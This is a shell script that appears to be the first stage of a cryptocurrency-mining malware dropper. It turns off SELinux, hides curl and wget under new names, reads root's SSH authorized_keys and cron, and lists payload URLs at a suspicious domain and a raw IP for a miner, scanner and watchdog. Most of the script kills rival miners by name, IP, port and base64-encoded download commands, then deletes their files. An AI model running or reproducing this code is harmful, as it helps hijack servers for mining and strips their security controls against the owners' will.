#!/bin/sh
setenforce 0 2>dev/null
echo SELINUX=disabled > /etc/sysconfig/selinux 2>/dev/null
sync && echo 3 >/proc/sys/vm/drop_caches
crondir='/var/spool/cron/'"$USER"
cont=`cat ${crondir}`
ssht=`cat /root/.ssh/authorized_keys`
echo 1 > /etc/sysupdates
rtdir="/etc/sysupdates"
bbdir="/usr/bin/curl"
bbdira="/usr/bin/cur"
ccdir="/usr/bin/wget"
ccdira="/usr/bin/wge"
mv /usr/bin/wget /usr/bin/get
mv /usr/bin/xget /usr/bin/get
mv /usr/bin/get /usr/bin/wge
mv /usr/bin/curl /usr/bin/url
mv /usr/bin/xurl /usr/bin/url
mv /usr/bin/url /usr/bin/cur
miner_url="https://de.gsearch.com.de/api/sysupdate"
miner_url_backup="http://185.181.10.234/E5DB0E07C3D7BE80V520/sysupdate"
miner_size="1102480"
sh_url="https://de.gsearch.com.de/api/update.sh"
sh_url_backup="http://185.181.10.234/E5DB0E07C3D7BE80V520/update.sh"
config_url="https://de.gsearch.com.de/api/config.json"
config_url_backup="http://185.181.10.234/E5DB0E07C3D7BE80V520/config.json"
config_size="3356"
scan_url="https://de.gsearch.com.de/api/networkservice"
scan_url_backup="http://185.181.10.234/E5DB0E07C3D7BE80V520/networkservice"
scan_size="2584072"
watchdog_url="https://de.gsearch.com.de/api/sysguard"
watchdog_url_backup="http://185.181.10.234/E5DB0E07C3D7BE80V520/sysguard"
watchdog_size="1929480"

kill_miner_proc()
{
    ps auxf|grep kinsing| awk '{print $2}'|xargs kill -9
    ps auxf|grep kdevtmpfsi| awk '{print $2}'|xargs kill -9
    ps auxf|grep -v grep|grep "mine.moneropool.com"|awk '{print $2}'|xargs kill -9
    ps auxf|grep -v grep|grep "pool.t00ls.ru"|awk '{print $2}'|xargs kill -9
    ps auxf|grep -v grep|grep "xmr.crypto-pool.fr:8080"|awk '{print $2}'|xargs kill -9
    ps auxf|grep -v grep|grep "xmr.crypto-pool.fr:3333"|awk '{print $2}'|xargs kill -9
    ps auxf|grep -v grep|grep "zhuabcn@yahoo.com"|awk '{print $2}'|xargs kill -9
    ps auxf|grep -v grep|grep "monerohash.com"|awk '{print $2}'|xargs kill -9
    ps auxf|grep -v grep|grep "/tmp/a7b104c270"|awk '{print $2}'|xargs kill -9
    ps auxf|grep -v grep|grep "xmr.crypto-pool.fr:6666"|awk '{print $2}'|xargs kill -9
    ps auxf|grep -v grep|grep "xmr.crypto-pool.fr:7777"|awk '{print $2}'|xargs kill -9
    ps auxf|grep -v grep|grep "xmr.crypto-pool.fr:443"|awk '{print $2}'|xargs kill -9
    ps auxf|grep -v grep|grep "stratum.f2pool.com:8888"|awk '{print $2}'|xargs kill -9
    ps auxf|grep -v grep|grep "xmrpool.eu" | awk '{print $2}'|xargs kill -9
    ps auxf|grep xiaoyao| awk '{print $2}'|xargs kill -9
    ps auxf|grep xiaoxue| awk '{print $2}'|xargs kill -9
    ps ax|grep var|grep lib|grep jenkins|grep -v httpPort|grep -v headless|grep "\-c"|xargs kill -9
    ps ax|grep -o './[0-9]* -c'| xargs pkill -f
	ps aux | grep -v grep | grep 'kdevtmpfsi' | awk '{print $2}' | xargs -I % kill -9 %
	ps aux | grep -v grep | grep 'kinsing' | awk '{print $2}' | xargs -I % kill -9 %
	ps aux | grep -v grep | grep 'redis2' | awk '{print $2}' | xargs -I % kill -9 %
    pkill -f biosetjenkins
    pkill -f Loopback
    pkill -f apaceha
    pkill -f cryptonight
    pkill -f stratum
    pkill -f mixnerdx
    pkill -f performedl
    pkill -f JnKihGjn
    pkill -f irqba2anc1
    pkill -f irqba5xnc1
    pkill -f irqbnc1
    pkill -f ir29xc1
    pkill -f conns
    pkill -f irqbalance
    pkill -f crypto-pool
    pkill -f minexmr
    pkill -f XJnRj
    pkill -f mgwsl
    pkill -f pythno
    pkill -f jweri
    pkill -f lx26
    pkill -f NXLAi
    pkill -f BI5zj
    pkill -f askdljlqw
    pkill -f minerd
    pkill -f minergate
    pkill -f Guard.sh
    pkill -f ysaydh
    pkill -f bonns
    pkill -f donns
    pkill -f kxjd
    pkill -f Duck.sh
    pkill -f bonn.sh
    pkill -f conn.sh
    pkill -f kworker34
    pkill -f kw.sh
    pkill -f pro.sh
    pkill -f polkitd
    pkill -f acpid
    pkill -f icb5o
    pkill -f nopxi
    pkill -f irqbalanc1
    pkill -f minerd
    pkill -f i586
    pkill -f gddr
    pkill -f mstxmr
    pkill -f ddg.2011
    pkill -f wnTKYg
    pkill -f deamon
    pkill -f disk_genius
    pkill -f sourplum
    pkill -f polkitd
    pkill -f nanoWatch
    pkill -f zigw
    pkill -f devtool
    pkill -f systemctI
    pkill -f WmiPrwSe
	sleep 1
	netstat -anp | grep 185.71.65.238 | awk '{print $7}' | awk -F'[/]' '{print $1}' | xargs -I % kill -9 %
	netstat -anp | grep 140.82.52.87 | awk '{print $7}' | awk -F'[/]' '{print $1}' | xargs -I % kill -9 %
	netstat -anp | grep :443 | awk '{print $7}' | awk -F'[/]' '{print $1}' | grep -v "-" | xargs -I % kill -9 %
	netstat -anp | grep :23 | awk '{print $7}' | awk -F'[/]' '{print $1}' | grep -v "-" | xargs -I % kill -9 %
	netstat -anp | grep :443 | awk '{print $7}' | awk -F'[/]' '{print $1}' | grep -v "-" | xargs -I % kill -9 %
	netstat -anp | grep :143 | awk '{print $7}' | awk -F'[/]' '{print $1}' | grep -v "-" | xargs -I % kill -9 %
	netstat -anp | grep :2222 | awk '{print $7}' | awk -F'[/]' '{print $1}' | grep -v "-" | xargs -I % kill -9 %
	netstat -anp | grep :3333 | awk '{print $7}' | awk -F'[/]' '{print $1}' | grep -v "-" | xargs -I % kill -9 %
	netstat -anp | grep :3389 | awk '{print $7}' | awk -F'[/]' '{print $1}' | grep -v "-" | xargs -I % kill -9 %
	netstat -anp | grep :4444 | awk '{print $7}' | awk -F'[/]' '{print $1}' | grep -v "-" | xargs -I % kill -9 %
	netstat -anp | grep :5555 | awk '{print $7}' | awk -F'[/]' '{print $1}' | grep -v "-" | xargs -I % kill -9 %
	netstat -anp | grep :6666 | awk '{print $7}' | awk -F'[/]' '{print $1}' | grep -v "-" | xargs -I % kill -9 %
	netstat -anp | grep :6665 | awk '{print $7}' | awk -F'[/]' '{print $1}' | grep -v "-" | xargs -I % kill -9 %
	netstat -anp | grep :6667 | awk '{print $7}' | awk -F'[/]' '{print $1}' | grep -v "-" | xargs -I % kill -9 %
	netstat -anp | grep :7777 | awk '{print $7}' | awk -F'[/]' '{print $1}' | grep -v "-" | xargs -I % kill -9 %
	netstat -anp | grep :8444 | awk '{print $7}' | awk -F'[/]' '{print $1}' | grep -v "-" | xargs -I % kill -9 %
	netstat -anp | grep :3347 | awk '{print $7}' | awk -F'[/]' '{print $1}' | grep -v "-" | xargs -I % kill -9 %
	netstat -anp | grep :14433 | awk '{print $7}' | awk -F'[/]' '{print $1}' | grep -v "-" | xargs -I % kill -9 %
	ps aux | grep -v grep | grep ':3333' | awk '{print $2}' | xargs -I % kill -9 %
	ps aux | grep -v grep | grep ':5555' | awk '{print $2}' | xargs -I % kill -9 %
	ps aux | grep -v grep | grep 'kworker -c\' | awk '{print $2}' | xargs -I % kill -9 %
	ps aux | grep -v grep | grep 'log_' | awk '{print $2}' | xargs -I % kill -9 %
	ps aux | grep -v grep | grep 'systemten' | awk '{print $2}' | xargs -I % kill -9 %
	ps aux | grep -v grep | grep 'netns' | awk '{print $2}' | xargs -I % kill -9 %
	ps aux | grep -v grep | grep 'voltuned' | awk '{print $2}' | xargs -I % kill -9 %
	ps aux | grep -v grep | grep 'darwin' | awk '{print $2}' | xargs -I % kill -9 %
	ps aux | grep -v grep | grep '/tmp/dl' | awk '{print $2}' | xargs -I % kill -9 %
	ps aux | grep -v grep | grep '/tmp/ddg' | awk '{print $2}' | xargs -I % kill -9 %
	ps aux | grep -v grep | grep '/tmp/pprt' | awk '{print $2}' | xargs -I % kill -9 %
	ps aux | grep -v grep | grep '/tmp/ppol' | awk '{print $2}' | xargs -I % kill -9 %
	ps aux | grep -v grep | grep '/tmp/65ccE*' | awk '{print $2}' | xargs -I % kill -9 %
	ps aux | grep -v grep | grep '/tmp/jmx*' | awk '{print $2}' | xargs -I % kill -9 %
	ps aux | grep -v grep | grep '/tmp/2Ne80*' | awk '{print $2}' | xargs -I % kill -9 %
	ps aux | grep -v grep | grep 'IOFoqIgyC0zmf2UR' | awk '{print $2}' | xargs -I % kill -9 %
	ps aux | grep -v grep | grep '45.76.122.92' | awk '{print $2}' | xargs -I % kill -9 %
	ps aux | grep -v grep | grep '51.38.191.178' | awk '{print $2}' | xargs -I % kill -9 %
	ps aux | grep -v grep | grep '51.15.56.161' | awk '{print $2}' | xargs -I % kill -9 %
	ps aux | grep -v grep | grep '86s.jpg' | awk '{print $2}' | xargs -I % kill -9 %
	ps aux | grep -v grep | grep 'aGTSGJJp' | awk '{print $2}' | xargs -I % kill -9 %
	ps aux | grep -v grep | grep 'nMrfmnRa' | awk '{print $2}' | xargs -I % kill -9 %
	ps aux | grep -v grep | grep 'PuNY5tm2' | awk '{print $2}' | xargs -I % kill -9 %
	ps aux | grep -v grep | grep 'I0r8Jyyt' | awk '{print $2}' | xargs -I % kill -9 %
	ps aux | grep -v grep | grep 'AgdgACUD' | awk '{print $2}' | xargs -I % kill -9 %
	ps aux | grep -v grep | grep 'uiZvwxG8' | awk '{print $2}' | xargs -I % kill -9 %
	ps aux | grep -v grep | grep 'hahwNEdB' | awk '{print $2}' | xargs -I % kill -9 %
	ps aux | grep -v grep | grep 'BtwXn5qH' | awk '{print $2}' | xargs -I % kill -9 %
	ps aux | grep -v grep | grep '3XEzey2T' | awk '{print $2}' | xargs -I % kill -9 %
	ps aux | grep -v grep | grep 't2tKrCSZ' | awk '{print $2}' | xargs -I % kill -9 %
	ps aux | grep -v grep | grep 'HD7fcBgg' | awk '{print $2}' | xargs -I % kill -9 %
	ps aux | grep -v grep | grep 'zXcDajSs' | awk '{print $2}' | xargs -I % kill -9 %
	ps aux | grep -v grep | grep '3lmigMo' | awk '{print $2}' | xargs -I % kill -9 %
	ps aux | grep -v grep | grep 'AkMK4A2' | awk '{print $2}' | xargs -I % kill -9 %
	ps aux | grep -v grep | grep 'AJ2AkKe' | awk '{print $2}' | xargs -I % kill -9 %
	ps aux | grep -v grep | grep 'HiPxCJRS' | awk '{print $2}' | xargs -I % kill -9 %
	ps aux | grep -v grep | grep 'http_0xCC030' | awk '{print $2}' | xargs -I % kill -9 %
	ps aux | grep -v grep | grep 'http_0xCC031' | awk '{print $2}' | xargs -I % kill -9 %
	ps aux | grep -v grep | grep 'http_0xCC032' | awk '{print $2}' | xargs -I % kill -9 %
	ps aux | grep -v grep | grep 'http_0xCC033' | awk '{print $2}' | xargs -I % kill -9 %
	ps aux | grep -v grep | grep "C4iLM4L" | awk '{print $2}' | xargs -I % kill -9 %
	ps aux | grep -v grep | grep 'aziplcr72qjhzvin' | awk '{print $2}' | xargs -I % kill -9 %
	ps aux | grep -v grep | awk '{ if(substr($11,1,2)=="./" && substr($12,1,2)=="./") print $2 }' | xargs -I % kill -9 %
	ps aux | grep -v grep | grep '/boot/vmlinuz' | awk '{print $2}' | xargs -I % kill -9 %
	ps aux | grep -v grep | grep "i4b503a52cc5" | awk '{print $2}' | xargs -I % kill -9 %
	ps aux | grep -v grep | grep "dgqtrcst23rtdi3ldqk322j2" | awk '{print $2}' | xargs -I % kill -9 %
	ps aux | grep -v grep | grep "2g0uv7npuhrlatd" | awk '{print $2}' | xargs -I % kill -9 %
	ps aux | grep -v grep | grep "nqscheduler" | awk '{print $2}' | xargs -I % kill -9 %
	ps aux | grep -v grep | grep "rkebbwgqpl4npmm" | awk '{print $2}' | xargs -I % kill -9 %
	ps aux | grep -v grep | grep -v aux | grep "]" | awk '$3>10.0{print $2}' | xargs -I % kill -9 %
	ps aux | grep -v grep | grep "2fhtu70teuhtoh78jc5s" | awk '{print $2}' | xargs -I % kill -9 %
	ps aux | grep -v grep | grep "0kwti6ut420t" | awk '{print $2}' | xargs -I % kill -9 %
	ps aux | grep -v grep | grep "44ct7udt0patws3agkdfqnjm" | awk '{print $2}' | xargs -I % kill -9 %
	ps aux | grep -v grep | grep -v "/" | grep -v "-" | grep -v "_" | awk 'length($11)>19{print $2}' | xargs -I % kill -9 %
	ps aux | grep -v grep | grep "\[^" | awk '{print $2}' | xargs -I % kill -9 %
	ps aux | grep -v grep | grep "rsync" | awk '{print $2}' | xargs -I % kill -9 %
	ps aux | grep -v grep | grep "watchd0g" | awk '{print $2}' | xargs -I % kill -9 %
	ps aux | grep -v grep | egrep 'wnTKYg|2t3ik|qW3xT.2|ddg' | awk '{print $2}' | xargs -I % kill -9 %
	ps aux | grep -v grep | grep "158.69.133.18:8220" | awk '{print $2}' | xargs -I % kill -9 %
	ps aux | grep -v grep | grep "/tmp/java" | awk '{print $2}' | xargs -I % kill -9 %
	ps aux | grep -v grep | grep 'gitee.com' | awk '{print $2}' | xargs -I % kill -9 %
	ps aux | grep -v grep | grep '/tmp/java' | awk '{print $2}' | xargs -I % kill -9 %
	ps aux | grep -v grep | grep '104.248.4.162' | awk '{print $2}' | xargs -I % kill -9 %
	ps aux | grep -v grep | grep '89.35.39.78' | awk '{print $2}' | xargs -I % kill -9 %
	ps aux | grep -v grep | grep '/dev/shm/z3.sh' | awk '{print $2}' | xargs -I % kill -9 %
	ps aux | grep -v grep | grep 'kthrotlds' | awk '{print $2}' | xargs -I % kill -9 %
	ps aux | grep -v grep | grep 'ksoftirqds' | awk '{print $2}' | xargs -I % kill -9 %
	ps aux | grep -v grep | grep 'netdns' | awk '{print $2}' | xargs -I % kill -9 %
	ps aux | grep -v grep | grep 'watchdogs' | awk '{print $2}' | xargs -I % kill -9 %
	ps aux | grep -v grep | grep 'kdevtmpfsi' | awk '{print $2}' | xargs -I % kill -9 %
	ps aux | grep -v grep | grep 'kinsing' | awk '{print $2}' | xargs -I % kill -9 %
	ps aux | grep -v grep | grep 'redis2' | awk '{print $2}' | xargs -I % kill -9 %
	ps aux | grep -v grep | grep -v root | grep -v dblaunch | grep -v dblaunchs | grep -v dblaunched | grep -v apache2 | grep -v atd | grep -v kdevtmpfsi | awk '$3>80.0{print $2}' | xargs -I % kill -9 %
	ps aux | grep -v grep | grep -v aux | grep " ps" | awk '{print $2}' | xargs -I % kill -9 %
	ps aux | grep -v grep | grep "sync_supers" | cut -c 9-15 | xargs -I % kill -9 %
	ps aux | grep -v grep | grep "cpuset" | cut -c 9-15 | xargs -I % kill -9 %
	ps aux | grep -v grep | grep -v aux | grep "x]" | awk '{print $2}' | xargs -I % kill -9 %
	ps aux | grep -v grep | grep -v aux | grep "sh] <" | awk '{print $2}' | xargs -I % kill -9 %
	ps aux | grep -v grep | grep -v aux | grep " \[]" | awk '{print $2}' | xargs -I % kill -9 %
	ps aux | grep -v grep | grep '/tmp/l.sh' | awk '{print $2}' | xargs -I % kill -9 %
	ps aux | grep -v grep | grep '/tmp/zmcat' | awk '{print $2}' | xargs -I % kill -9 %
	ps aux | grep -v grep | grep 'hahwNEdB' | awk '{print $2}' | xargs -I % kill -9 %
	ps aux | grep -v grep | grep 'CnzFVPLF' | awk '{print $2}' | xargs -I % kill -9 %
	ps aux | grep -v grep | grep 'CvKzzZLs' | awk '{print $2}' | xargs -I % kill -9 %
	ps aux | grep -v grep | grep 'aziplcr72qjhzvin' | awk '{print $2}' | xargs -I % kill -9 %
	ps aux | grep -v grep | grep '/tmp/udevd' | awk '{print $2}' | xargs -I % kill -9 %
	ps aux | grep -v grep | grep 'KCBjdXJsIC1vIC0gaHR0cDovLzg5LjIyMS41Mi4xMjIvcy5zaCApIHwgYmFzaCA' | awk '{print $2}' | xargs -I % kill -9 %
	ps aux | grep -v grep | grep 'Y3VybCAtcyBodHRwOi8vMTA3LjE3NC40Ny4xNTYvbXIuc2ggfCBiYXNoIC1zaAo' | awk '{print $2}' | xargs -I % kill -9 %
	ps aux | grep -v grep | grep 'sustse' | awk '{print $2}' | xargs -I % kill -9 %
	ps aux | grep -v grep | grep 'sustse3' | awk '{print $2}' | xargs -I % kill -9 %
	ps aux | grep -v grep | grep 'mr.sh' | grep 'wget' | awk '{print $2}' | xargs -I % kill -9 %
	ps aux | grep -v grep | grep 'mr.sh' | grep 'curl' | awk '{print $2}' | xargs -I % kill -9 %
	ps aux | grep -v grep | grep '2mr.sh' | grep 'wget' | awk '{print $2}' | xargs -I % kill -9 %
	ps aux | grep -v grep | grep '2mr.sh' | grep 'curl' | awk '{print $2}' | xargs -I % kill -9 %
	ps aux | grep -v grep | grep 'cr5.sh' | grep 'wget' | awk '{print $2}' | xargs -I % kill -9 %
	ps aux | grep -v grep | grep 'cr5.sh' | grep 'curl' | awk '{print $2}' | xargs -I % kill -9 %
	ps aux | grep -v grep | grep 'logo9.jpg' | grep 'wget' | awk '{print $2}' | xargs -I % kill -9 %
	ps aux | grep -v grep | grep 'logo9.jpg' | grep 'curl' | awk '{print $2}' | xargs -I % kill -9 %
	ps aux | grep -v grep | grep 'j2.conf' | awk '{print $2}' | xargs -I % kill -9 %
	ps aux | grep -v grep | grep 'luk-cpu' | grep 'wget' | awk '{print $2}' | xargs -I % kill -9 %
	ps aux | grep -v grep | grep 'luk-cpu' | grep 'curl' | awk '{print $2}' | xargs -I % kill -9 %
	ps aux | grep -v grep | grep 'ficov' | grep 'wget' | awk '{print $2}' | xargs -I % kill -9 %
	ps aux | grep -v grep | grep 'ficov' | grep 'curl' | awk '{print $2}' | xargs -I % kill -9 %
	ps aux | grep -v grep | grep 'he.sh' | grep 'wget' | awk '{print $2}' | xargs -I % kill -9 %
	ps aux | grep -v grep | grep 'he.sh' | grep 'curl' | awk '{print $2}' | xargs -I % kill -9 %
	ps aux | grep -v grep | grep 'miner.sh' | grep 'wget' | awk '{print $2}' | xargs -I % kill -9 %
	ps aux | grep -v grep | grep 'miner.sh' | grep 'curl' | awk '{print $2}' | xargs -I % kill -9 %
	ps aux | grep -v grep | grep 'nullcrew' | grep 'wget' | awk '{print $2}' | xargs -I % kill -9 %
	ps aux | grep -v grep | grep 'nullcrew' | grep 'curl' | awk '{print $2}' | xargs -I % kill -9 %
	ps aux | grep -v grep | grep '107.174.47.156' | awk '{print $2}' | xargs -I % kill -9 %
	ps aux | grep -v grep | grep '83.220.169.247' | awk '{print $2}' | xargs -I % kill -9 %
	ps aux | grep -v grep | grep '51.38.203.146' | awk '{print $2}' | xargs -I % kill -9 %
	ps aux | grep -v grep | grep '144.217.45.45' | awk '{print $2}' | xargs -I % kill -9 %
	ps aux | grep -v grep | grep '107.174.47.181' | awk '{print $2}' | xargs -I % kill -9 %
	ps aux | grep -v grep | grep '176.31.6.16' | awk '{print $2}' | xargs -I % kill -9 %
	ps auxf | grep -v grep | grep "mine.moneropool.com" | awk '{print $2}' | xargs -I % kill -9 %
	ps auxf | grep -v grep | grep "pool.t00ls.ru" | awk '{print $2}' | xargs -I % kill -9 %
	ps auxf | grep -v grep | grep "xmr.crypto-pool.fr:8080" | awk '{print $2}' | xargs -I % kill -9 %
	ps auxf | grep -v grep | grep "xmr.crypto-pool.fr:3333" | awk '{print $2}' | xargs -I % kill -9 %
	ps auxf | grep -v grep | grep "zhuabcn@yahoo.com" | awk '{print $2}' | xargs -I % kill -9 %
	ps auxf | grep -v grep | grep "monerohash.com" | awk '{print $2}' | xargs -I % kill -9 %
	ps auxf | grep -v grep | grep "/tmp/a7b104c270" | awk '{print $2}' | xargs -I % kill -9 %
	ps auxf | grep -v grep | grep "xmr.crypto-pool.fr:6666" | awk '{print $2}' | xargs -I % kill -9 %
	ps auxf | grep -v grep | grep "xmr.crypto-pool.fr:7777" | awk '{print $2}' | xargs -I % kill -9 %
	ps auxf | grep -v grep | grep "xmr.crypto-pool.fr:443" | awk '{print $2}' | xargs -I % kill -9 %
	ps auxf | grep -v grep | grep "stratum.f2pool.com:8888" | awk '{print $2}' | xargs -I % kill -9 %
	ps auxf | grep -v grep | grep "xmrpool.eu" | awk '{print $2}' | xargs -I % kill -9 %
	ps auxf | grep -v grep | grep "kieuanilam.me" | awk '{print $2}' | xargs -I % kill -9 %
	ps auxf | grep xiaoyao | awk '{print $2}' | xargs -I % kill -9 %
	ps auxf | grep xiaoxue | awk '{print $2}' | xargs -I % kill -9 %
	netstat -antp | grep '46.243.253.15' | grep 'ESTABLISHED\|SYN_SENT' | awk '{print $7}' | sed -e "s/\/.*//g" | xargs -I % kill -9 %
	netstat -antp | grep '176.31.6.16' | grep 'ESTABLISHED\|SYN_SENT' | awk '{print $7}' | sed -e "s/\/.*//g" | xargs -I % kill -9 %
	pgrep -f monerohash | xargs -I % kill -9 %
	pgrep -f L2Jpbi9iYXN | xargs -I % kill -9 %
	pgrep -f xzpauectgr | xargs -I % kill -9 %
	pgrep -f slxfbkmxtd | xargs -I % kill -9 %
	pgrep -f mixtape | xargs -I % kill -9 %
	pgrep -f addnj | xargs -I % kill -9 %
	pgrep -f 200.68.17.196 | xargs -I % kill -9 %
	pgrep -f IyEvYmluL3NoCgpzUG | xargs -I % kill -9 %
	pgrep -f KHdnZXQgLXFPLSBodHRw | xargs -I % kill -9 %
	pgrep -f FEQ3eSp8omko5nx9e97hQ39NS3NMo6rxVQS3 | xargs -I % kill -9 %
	pgrep -f Y3VybCAxOTEuMTAxLjE4MC43Ni9saW4udHh0IHxzaAo | xargs -I % kill -9 %
	pgrep -f mwyumwdbpq.conf | xargs -I % kill -9 %
	pgrep -f honvbsasbf.conf | xargs -I % kill -9 %
	pgrep -f mqdsflm.cf | xargs -I % kill -9 %
	pgrep -f stratum | xargs -I % kill -9 %
	pgrep -f lower.sh | xargs -I % kill -9 %
	pgrep -f ./ppp | xargs -I % kill -9 %
	pgrep -f cryptonight | xargs -I % kill -9 %
	pgrep -f ./seervceaess | xargs -I % kill -9 %
	pgrep -f ./servceaess | xargs -I % kill -9 %
	pgrep -f ./servceas | xargs -I % kill -9 %
	pgrep -f ./servcesa | xargs -I % kill -9 %
	pgrep -f ./vsp | xargs -I % kill -9 %
	pgrep -f ./jvs | xargs -I % kill -9 %
	pgrep -f ./pvv | xargs -I % kill -9 %
	pgrep -f ./vpp | xargs -I % kill -9 %
	pgrep -f ./pces | xargs -I % kill -9 %
	pgrep -f ./rspce | xargs -I % kill -9 %
	pgrep -f ./haveged | xargs -I % kill -9 %
	pgrep -f ./jiba | xargs -I % kill -9 %
	pgrep -f ./watchbog | xargs -I % kill -9 %
	pgrep -f ./A7mA5gb | xargs -I % kill -9 %
	pgrep -f kacpi_svc | xargs -I % kill -9 %
	pgrep -f kswap_svc | xargs -I % kill -9 %
	pgrep -f kauditd_svc | xargs -I % kill -9 %
	pgrep -f kpsmoused_svc | xargs -I % kill -9 %
	pgrep -f kseriod_svc | xargs -I % kill -9 %
	pgrep -f kthreadd_svc | xargs -I % kill -9 %
	pgrep -f ksoftirqd_svc | xargs -I % kill -9 %
	pgrep -f kintegrityd_svc | xargs -I % kill -9 %
	pgrep -f jawa | xargs -I % kill -9 %
	pgrep -f oracle.jpg | xargs -I % kill -9 %
	pgrep -f 45cToD1FzkjAxHRBhYKKLg5utMGEN | xargs -I % kill -9 %
	pgrep -f 188.209.49.54 | xargs -I % kill -9 %
	pgrep -f 181.214.87.241 | xargs -I % kill -9 %
	pgrep -f etnkFgkKMumdqhrqxZ6729U7bY8pzRjYzGbXa5sDQ | xargs -I % kill -9 %
	pgrep -f 47TdedDgSXjZtJguKmYqha4sSrTvoPXnrYQEq2Lbj | xargs -I % kill -9 %
	pgrep -f etnkP9UjR55j9TKyiiXWiRELxTS51FjU9e1UapXyK | xargs -I % kill -9 %
	pgrep -f servim | xargs -I % kill -9 %
	pgrep -f kblockd_svc | xargs -I % kill -9 %
	pgrep -f native_svc | xargs -I % kill -9 %
	pgrep -f ynn | xargs -I % kill -9 %
	pgrep -f 65ccEJ7 | xargs -I % kill -9 %
	pgrep -f jmxx | xargs -I % kill -9 %
	pgrep -f 2Ne80nA | xargs -I % kill -9 %
	pgrep -f sysstats | xargs -I % kill -9 %
	pgrep -f systemxlv | xargs -I % kill -9 %
	pgrep -f watchbog | xargs -I % kill -9 %
	pgrep -f OIcJi1m | xargs -I % kill -9 %
	pkill -f biosetjenkins
	pkill -f Loopback
	pkill -f apaceha
	pkill -f cryptonight
	pkill -f stratum
	pkill -f mixnerdx
	pkill -f performedl
	pkill -f JnKihGjn
	pkill -f irqba2anc1
	pkill -f irqba5xnc1
	pkill -f irqbnc1
	pkill -f ir29xc1
	pkill -f conns
	pkill -f irqbalance
	pkill -f crypto-pool
	pkill -f XJnRj
	pkill -f mgwsl
	pkill -f pythno
	pkill -f jweri
	pkill -f lx26
	pkill -f NXLAi
	pkill -f BI5zj
	pkill -f askdljlqw
	pkill -f minerd
	pkill -f minergate
	pkill -f Guard.sh
	pkill -f ysaydh
	pkill -f bonns
	pkill -f donns
	pkill -f kxjd
	pkill -f Duck.sh
	pkill -f bonn.sh
	pkill -f conn.sh
	pkill -f kworker34
	pkill -f kw.sh
	pkill -f pro.sh
	pkill -f polkitd
	pkill -f acpid
	pkill -f icb5o
	pkill -f nopxi
	pkill -f irqbalanc1
	pkill -f minerd
	pkill -f i586
	pkill -f gddr
	pkill -f mstxmr
	pkill -f ddg.2011
	pkill -f wnTKYg
	pkill -f deamon
	pkill -f disk_genius
	pkill -f sourplum
	pkill -f polkitd
	pkill -f nanoWatch
	pkill -f zigw
	pkill -f devtool
	pkill -f devtools
	pkill -f systemctI
	pkill -f watchbog
	pkill -f cryptonight
	pkill -f sustes
	pkill -f xmrig
	pkill -f xmrig-cpu
	pkill -f 121.42.151.137
	pkill -f init12.cfg
	pkill -f nginxk
	pkill -f tmp/wc.conf
	pkill -f xmrig-notls
	pkill -f xmr-stak
	pkill -f suppoie
	pkill -f zer0day.ru
	pkill -f dbus-daemon--system
	pkill -f nullcrew
	pkill -f systemctI
	pkill -f kworkerds
	pkill -f init10.cfg
	pkill -f /wl.conf
	pkill -f crond64
	pkill -f sustse
	pkill -f vmlinuz
	pkill -f exin
	pkill -f apachiii
	pkill -f networkservice
	rm -rf /usr/bin/config.json
	rm -rf /usr/bin/exin
	rm -rf /tmp/wc.conf
	rm -rf /tmp/log_rot
	rm -rf /tmp/apachiii
	rm -rf /tmp/sustse
	rm -rf /tmp/php
	rm -rf /tmp/p2.conf
	rm -rf /tmp/pprt
	rm -rf /tmp/ppol
	rm -rf /tmp/javax/config.sh
	rm -rf /tmp/javax/sshd2
	rm -rf /tmp/.profile
	rm -rf /tmp/1.so
	rm -rf /tmp/kworkerds
	rm -rf /tmp/kworkerds3
	rm -rf /tmp/kworkerdssx
	rm -rf /tmp/xd.json
	rm -rf /tmp/syslogd
	rm -rf /tmp/syslogdb
	rm -rf /tmp/65ccEJ7
	rm -rf /tmp/jmxx
	rm -rf /tmp/2Ne80nA
	rm -rf /tmp/dl
	rm -rf /tmp/ddg
	rm -rf /tmp/systemxlv
	rm -rf /tmp/systemctI
	rm -rf /tmp/.abc
	rm -rf /tmp/osw.hb
	rm -rf /tmp/.tmpleve
	rm -rf /tmp/.tmpnewzz
	rm -rf /tmp/.java
	rm -rf /tmp/.omed
	rm -rf /tmp/.tmpc
	rm -rf /tmp/.tmpleve
	rm -rf /tmp/.tmpnewzz
	rm -rf /tmp/gates.lod
	rm -rf /tmp/conf.n
	rm -rf /tmp/devtool
	rm -rf /tmp/devtools
	rm -rf /tmp/fs
	rm -rf /tmp/.rod
	rm -rf /tmp/.rod.tgz
	rm -rf /tmp/.rod.tgz.1
	rm -rf /tmp/.rod.tgz.2
	rm -rf /tmp/.mer
	rm -rf /tmp/.mer.tgz
	rm -rf /tmp/.mer.tgz.1
	rm -rf /tmp/.hod
	rm -rf /tmp/.hod.tgz
	rm -rf /tmp/.hod.tgz.1
	rm -rf /tmp/84Onmce
	rm -rf /tmp/C4iLM4L
	rm -rf /tmp/lilpip
	rm -rf /tmp/3lmigMo
	rm -rf /tmp/am8jmBP
	rm -rf /tmp/tmp.txt
	rm -rf /tmp/baby
	rm -rf /tmp/.lib
	rm -rf /tmp/systemd
	rm -rf /tmp/lib.tar.gz
	rm -rf /tmp/baby
	rm -rf /tmp/java
	rm -rf /tmp/j2.conf
	rm -rf /tmp/.mynews1234
	rm -rf /tmp/a3e12d
	rm -rf /tmp/.pt
	rm -rf /tmp/.pt.tgz
	rm -rf /tmp/.pt.tgz.1
	rm -rf /tmp/go
	rm -rf /tmp/java
	rm -rf /tmp/j2.conf
	rm -rf /tmp/.tmpnewasss
	rm -rf /tmp/java
	rm -rf /tmp/go.sh
	rm -rf /tmp/go2.sh
	rm -rf /tmp/khugepageds
	rm -rf /tmp/.censusqqqqqqqqq
	rm -rf /tmp/.kerberods
	rm -rf /tmp/kerberods
	rm -rf /tmp/seasame
	rm -rf /tmp/touch
	rm -rf /tmp/.p
	rm -rf /tmp/runtime2.sh
	rm -rf /tmp/runtime.sh
	rm -rf /dev/shm/z3.sh
	rm -rf /dev/shm/z2.sh
	rm -rf /dev/shm/.scr
	rm -rf /dev/shm/.kerberods
	rm -f /etc/ld.so.preload
	rm -f /usr/local/lib/libioset.so
	chattr -i /etc/ld.so.preload
	rm -f /etc/ld.so.preload
	rm -f /usr/local/lib/libioset.so
	rm -rf /tmp/watchdogs
	rm -rf /etc/cron.d/tomcat
	rm -rf /etc/rc.d/init.d/watchdogs
	rm -rf /usr/sbin/watchdogs
	rm -f /tmp/kthrotlds
	rm -f /etc/rc.d/init.d/kthrotlds
	rm -rf /tmp/.sysbabyuuuuu12
	rm -rf /tmp/logo9.jpg
	rm -rf /tmp/miner.sh
	rm -rf /tmp/nullcrew
	rm -rf /tmp/proc
